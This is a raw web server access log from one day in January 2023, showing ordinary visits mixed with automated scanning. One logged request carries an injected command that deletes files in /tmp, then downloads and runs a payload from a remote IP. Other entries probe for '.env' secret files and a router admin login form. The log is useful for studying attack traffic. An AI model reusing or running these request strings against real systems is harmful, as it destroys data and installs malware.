143.110.222.166 - - [30/Jan/2023:09:07:41 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
119.201.163.94 - - [30/Jan/2023:09:45:06 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 301 300 "-" "Hello, world"
64.85.173.196 - - [30/Jan/2023:09:46:35 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.85.173.196 - - [30/Jan/2023:09:46:36 -0600] "POST / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [30/Jan/2023:10:08:47 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
187.4.100.28 - - [30/Jan/2023:10:28:35 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
143.110.222.166 - - [30/Jan/2023:11:12:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [30/Jan/2023:11:46:38 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.248.133.119 - - [30/Jan/2023:11:48:51 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
167.248.133.119 - - [30/Jan/2023:11:48:51 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.119 - - [30/Jan/2023:11:48:51 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
143.110.222.166 - - [30/Jan/2023:12:09:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [30/Jan/2023:13:11:31 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [30/Jan/2023:13:17:36 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.9.110.186 - - [30/Jan/2023:14:01:26 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
45.9.110.186 - - [30/Jan/2023:14:01:28 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.9.110.186 - - [30/Jan/2023:14:01:29 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.9.110.186 - - [30/Jan/2023:14:01:30 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
143.110.222.166 - - [30/Jan/2023:14:11:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
36.102.6.58 - - [30/Jan/2023:14:16:05 -0600] "GET / HTTP/1.1" 400 226 "-" "-"
